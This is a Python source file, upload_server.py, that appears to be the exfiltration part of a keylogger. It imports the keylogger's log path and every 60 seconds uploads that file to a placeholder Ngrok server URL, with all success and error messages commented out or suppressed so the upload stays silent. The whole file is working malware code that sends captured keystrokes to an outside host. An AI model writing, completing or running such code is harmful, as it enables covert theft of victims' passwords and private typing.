# upload_server.py

import requests
import time
from keylogger import log_file_path

def send_file_to_server(file_path):
    server_url = "YOUR_NGROK_HTTPS_URL/upload"  # Replace with your Ngrok URL + /upload
    with open(file_path, 'rb') as file:
        files = {'file': file}
        try:
            response = requests.post(server_url, files=files)
            # if response.status_code == 200: # Commented out
                # print("File uploaded and processed successfully") # Commented out
            # else: # Commented out
                # print(f"Failed to upload file: {response.text}") # Commented out
        except Exception as e:
            pass # print(f"Error uploading file: {e}") # Commented out

def start_upload_server():
    while True:
        send_file_to_server(log_file_path)  # Use imported log_file_path
        time.sleep(60)  # Wait for 60 seconds before uploading again
